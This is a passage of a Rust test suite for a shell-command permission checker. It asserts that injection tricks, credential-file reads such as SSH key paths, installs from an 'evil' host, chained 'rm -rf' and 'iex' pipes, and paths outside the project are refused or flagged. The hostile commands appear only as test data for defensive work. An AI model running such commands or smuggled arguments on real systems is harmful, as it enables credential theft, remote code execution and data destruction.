        let rules = "git commit|git add|git rm|git mv|git merge|git rebase|git pull|git fetch|git clone|git config|git stash|git tag|git branch|git switch|git apply|git am|git cherry-pick|git revert|git submodule|git worktree|git gc|git filter-branch|git update-ref|git remote|npm exec|npm x|npm run|npm run-script|npm start|npm publish|npm config|npm set|pnpm exec|pnpm dlx|pnpm run|yarn exec|yarn dlx|yarn run|bun x|bun run|cargo run|cargo install|cargo publish|go run|go install|go generate|dotnet run|npm rum|npm urn|npm restart|npm stop|npm rebuild|npm rb|cargo r";
        for r in rules.split('|') {
            assert!(is_never_rule(r), "{r}");
        }
        for ok in [
            "npm install",
            "npm ci",
            "npm test",
            "git status",
            "cargo test",
        ] {
            assert!(!is_never_rule(ok), "{ok}");
        }
    }

    #[test]
    fn never_rules_give_no_rule_and_no_offer() {
        for (_, items) in NEVER.rules {
            for r in *items {
                for fam in [P, W] {
                    for cmd in [r.to_string(), format!("{r} x"), r.to_uppercase()] {
                        let got = inspect(&cmd, fam, root());
                        assert_eq!(got.rule, None, "rule for {cmd:?} ({fam:?})");
                        assert_eq!(got.offer, None, "offer for {cmd:?} ({fam:?})");
                    }
                }
            }
        }
        nothing(
            P,
            &[
                "git push",
                "git reset --hard",
                "git clean -fd",
                "git checkout .",
                "git restore .",
                "git PUSH",
                "npm run build",
                "npm exec foo",
                "npm x foo",
                "npm start",
                "npm publish",
                "npm config set a b",
                "npm set a b",
                "pnpm exec x",
                "pnpm dlx x",
                "pnpm run x",
                "yarn exec x",
                "yarn dlx x",
                "yarn run x",
                "bun x y",
                "bun run y",
                "cargo run",
                "cargo install x",
                "cargo publish",
                "go run .",
                "go install x",
                "go generate ./...",
                "dotnet run",
                // finding 5: aliases
                "npm rum build",
                "npm urn build",
                "npm run-s build",
                "npm run-p build",
                "npm exe foo",
                "npm ru build",
                "npm r build",
                "npm e foo",
                "npm ex foo",
                "npm xyz",
                "npm restart",
                "npm stop",
                "npm rebuild",
                "npm rb",
                "pnpm rum x",
                "pnpm restart",
                "yarn run-s x",
                "cargo r",
            ],
        );
    }

    #[test]
    fn findings_1_to_3_and_5_to_8_give_no_rule() {
        let cmds = [
            // 1: go
            "go test \"--exec=sh -c 'x' --\" ./...",
            "go test --exec=sh ./...",
            "go test --exec sh ./...",
            "go test --toolexec=/x ./...",
            "go test '-ldflags=-linkmode=external -extld=/x' ./...",
            "go test -o /Users/u/.zshrc -c",
            "go test -coverprofile=x",
            "go test -cpuprofile x",
            "go test -trace=x",
            "go test -outputdir x",
            "go test -exec=calc",
            "go test -args -x",
            // 2: npm abbreviations
            "npm test --script-sh=/x",
            "npm test --script-shel=/tmp/x",
            "npm test --prefi=/x",
            "npm install --userc=/x",
            "npm test \"--node-opt=--import=data:text/javascript,x\"",
            "npm install --usercon /x",
            // 3: cmd.exe re-reading
            "npm.cmd install 'x&calc'",
            "tsc.cmd 'x&calc'",
            "eslint.cmd 'x|calc'",
            "npm.bat install \"x>C:\\Users\\u\\x\"",
            "npm.cmd install '%USERPROFILE%'",
            "npm install 'x&calc'",
            // 6
            "npm install -Dg evil",
            "npm install -sg evil",
            "npm install --location=global evil",
            "npm install -reg http://evil",
            // 7: PowerShell 5.1 embedded quotes
            "git log 'a\" --output=C:\\Users\\u\\x \"'",
            "npm test 'a\" --script-shell=calc \"'",
            "go test 'a\" -exec=calc \"'",
            "cargo test 'a\" --config=x \"'",
            // 8
            "cat /etc/passwd",
            "cat /Users/u/.ssh/id_rsa",
            "pytest --basetemp=/Users/u/Documents",
            "pytest --junitxml=/x",
            "pytest --pastebin=all",
            "eslint -c /tmp/x.js",
            "eslint -f /x.js",
            "eslint -o /x",
            "tsc --outFile x",
            "tsc --outDir x",
            "cargo test --target-dir /x",
            "cargo test -- --logfile /x",
            "cargo build --manifest-path=/other/Cargo.toml",
            "npm install /tmp/evil",
            "npm install ./dir",
            "npm install git+https://evil.example/x",
        ];
        no_rule(P, &cmds);
        no_rule(W, &cmds);
    }

    #[test]
    fn finding_4_never_panics() {
        for c in ["ls -é", "cat -€x", "npm install -\u{200b}g"] {
            for fam in [P, W] {
                let got = inspect(c, fam, root());
                assert_eq!(got.rule, None, "{c:?}");
            }
        }
    }

    #[test]
    fn inspect_never_panics_on_generated_strings() {
        let pool: Vec<char> = "abcxyzLS019 -_./\\:=,~$%^&|;<>(){}[]*?!#'\"`@+\t\n\u{e9}\u{20ac}\u{200b}\u{202e}\u{1f600}\u{301}\u{a0}\u{2013}\u{2019}"
            .chars()
            .collect();
        let words = [
            "ls", "npm", "install", "git", "log", "cargo", "test", "--", "-n", "go", "cat",
        ];
        let mut state: u64 = 0x9e37_79b9_7f4a_7c15;
        let mut next = move || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        for _ in 0..4000 {
            let mut s = String::new();
            let len = (next() % 40) as usize;
            for _ in 0..len {
                let r = next();
                if r % 7 == 0 {
                    s.push_str(words[(r / 7) as usize % words.len()]);
                } else {
                    s.push(pool[(r / 11) as usize % pool.len()]);
                }
            }
            for fam in [P, W] {
                let _ = inspect(&s, fam, root());
            }
        }
    }

    #[test]
    fn arguments_follow_the_options_table() {
        no_rule(
            P,
            &[
                "ls -z",
                "ls --all",
                "ls -",
                "head -n x f",
                "head -n",
                "head -5 f",
                "cat -n f",
                "git log -n",
                "git log -n x",
                "git status --",
                "git status -uall",
                "git diff --no-index a b",
                "pwd x",
                "date -s x",
                "go test ./pkg",
                "go vet ./...",
                "go test -run",
                "go test -run a-b",
                "go test -count x",
                "go test -- -x",
                "go build -o x",
                "npm test x",
                "npm install -D",
                "cargo build x",
                "cargo test a b",
                "cargo test -- x",
                "cargo test -p",
                "cargo test -p -x",
                "cargo test --features a,b",
                "cargo fmt x",
                "pytest -k",
                "pytest -k a-b",
                "pytest -n 4",
                "tsc -p x",
                "prettier --write src",
                "ruff --fix",
                "cat ../x",
                "cat a/../b",
                "cat a/-b",
                "cat x@y",
                "cat .env",
                "cat .git/config",
                "cat src/.env.local",
                "cat /etc/hosts",
                "cat /home/u/proj/a.txt",
                "ls ~",
            ],
        );
    }

    #[test]
    fn allowed_matches_only_an_exact_saved_rule() {
        let saved = vec!["npm install".to_string(), "ls".to_string()];
        for (cmd, want) in [
            ("npm install", true),
            ("npm install lodash", false),
            ("npm install --save-dev x", false),
            ("npm run build", false),
            ("npm install && rm -rf .", false),
            ("npm install; rm -rf .", false),
            ("npm install $(id)", false),
            ("npm install\nrm -rf .", false),
            ("npm install --global x", false),
            ("npm --prefix /x install", false),
            ("npm ci", false),
            ("ls", true),
            ("ls -la", true),
            ("ls src", true),
            ("ls /etc", false),
            ("PATH=. npm install", false),
            ("rm x", false),
        ] {
            assert_eq!(allowed(cmd, P, root(), &saved), want, "{cmd:?}");
        }
        assert!(allowed("npm install", W, root(), &saved));
        assert!(allowed("NPM.CMD install", W, root(), &saved));
        assert!(!allowed("npm install | iex", W, root(), &saved));
        assert!(!allowed("npm install", P, root(), &[]));
        assert!(!allowed("rm x", P, root(), &["rm".to_string()]));
        assert!(!allowed("git push", P, root(), &["git push".to_string()]));
        let git = vec!["git status".to_string()];
        assert!(allowed("git status", P, root(), &git));
        assert!(!allowed("git -c core.pager=x status", P, root(), &git));
        assert!(!allowed("git Status", P, root(), &git));
        assert!(!allowed("GIT status", P, root(), &git));
    }

    #[test]
    fn powershell_special_forms_give_no_rule_and_no_offer() {
        nothing(
            W,
            &[
                "Remove-Item x",
                "ri x",
                "erase x",
                "move-item a b",
                "mi a b",
                "iex x",
                "Invoke-Expression x",
                "start-process x",
                "& x",
                "&x",
                "a | b",
                "$(x)",
                "{ x }",
                "ls; ls",
                "ls && ls",
                "ls || ls",
                "ls &",
                "a`b",
                "ls `",
                "$env:X",
                "ls $x",
                "echo 'a $b'",
                "echo \"a $b\"",
                "echo 'a`b'",
                "@(1)",
                "@{a=1}",
                "ls @args",
                "(ls)",
                "[int]1",
                "[System.IO.File]::Delete('x')",
                "ls > f",
                "ls >> f",
                "ls 2> f",
                "ls *> f",
                "ls < f",
                "npm --% x",
                ". ./x",
                ".\\x",
                ".x",
                "% x",
                "? x",
                "ls %",
                "# x",
                "ls # x",
                "echo a'b'",
                "echo 'a''b'",
                "echo 'abc",
                "echo \"abc",
                "echo \u{2018}x\u{2019}",
                "echo \u{201c}x\u{201d}",
                "echo a,b",
                "ls\nls",
                "ls\tx",
                "ls *",
                "ls a?",
                "~\\x",
                "'npm' install",
                "\"npm\" install",
                "npm 'install'",
                "C:\\x\\tool.exe",
                "node.exe x",
                "pwsh.exe x",
                "powershell -c x",
                "cmd /c x",
                "git push",
                "npm run x",
                "invoke-webrequest x",
                "iwr x",
                "set-content a b",
                "new-item a",
                "copy-item a b",
                "ni a",
                "sudo ls",
                "-ls",
                "npm install \u{2013}g",
                "make all",
                "docker run x",
                "curl http://x",
                "find . -exec x",
            ],
        );
    }

    #[test]
    fn extended_never_programs_apply_to_both_shells() {
        for c in [
            "make all",
            "docker run x",
            "curl http://x",
            "find . -exec x",
        ] {
            nothing(P, &[c]);
            nothing(W, &[c]);
        }
    }

    fn outside_rows(family: ShellFamily, rows: &[(&str, bool)]) {
        for (cmd, want) in rows {
            let got = inspect(cmd, family, root());
            assert_eq!(got.outside, *want, "outside for {cmd:?} ({family:?})");
            if *want {
                assert_eq!(got.rule, None, "rule for outside {cmd:?} ({family:?})");
            }
        }
    }

    #[test]
    fn outside_detects_places_beyond_the_project() {
        outside_rows(
            P,
            &[
                ("cat /etc/hosts", true),
                ("cat ~/x", true),
                ("ls ../../x", true),
                ("ls src/../a", false),
                ("cat /home/u/proj/a.txt", false),
                ("cat /home/u/proj", false),
                ("cat /home/u/proj/../x", true),
                ("cat /home/u/projx/a", true),
                ("cat /dev/null", false),
                ("cat /dev/null/../x", true),
                ("cat /dev/sda", true),
                ("cat /dev/tty", true),
                ("cat 'C:\\Users\\x'", true),
                ("cat C:\\x", true),
                ("cat '\\\\server\\share\\x'", true),
                ("cat 'C:/Users/x'", true),
                ("echo $HOME/x", true),
                ("echo ${HOME}/x", true),
                ("cat '%USERPROFILE%/x'", true),
                ("ls --dir=/etc", true),
                ("ls -C/etc", true),
                ("ls ..", true),
                ("ls .", false),
                ("ls a/../..", true),
                ("ls ..\\..\\x", true),
                ("ls a > /etc/x", true),
                ("ls a >/etc/x", true),
                ("ls 'a b/../c'", false),
                ("ls src", false),
                // finding 9
                ("ls -ld/etc", true),
                ("tsc --outDir:/etc", true),
                ("cat -LiteralPath:\\\\evil\\s\\x", true),
                ("ls a=b:~/c", true),
                ("ls a,/etc", true),
                ("ls x=..", true),
                ("ls -é/etc", true),
            ],
        );
    }

    #[test]
    fn outside_for_powershell() {
        outside_rows(
            W,
            &[
                ("type C:\\x\\y", true),
                ("cd ..\\..", true),
                ("type \\\\server\\share\\x", true),
                ("ls $env:USERPROFILE", true),
                ("ls $HOME\\x", true),
                ("ls %USERPROFILE%", true),
                ("ls %APPDATA%\\x", true),
                ("ls ~\\x", true),
                ("ls src\\..\\a", false),
                ("type /etc/hosts", true),
                ("type /dev/null", false),
                ("cat -LiteralPath:\\\\evil\\s\\x", true),
            ],
        );
    }
}
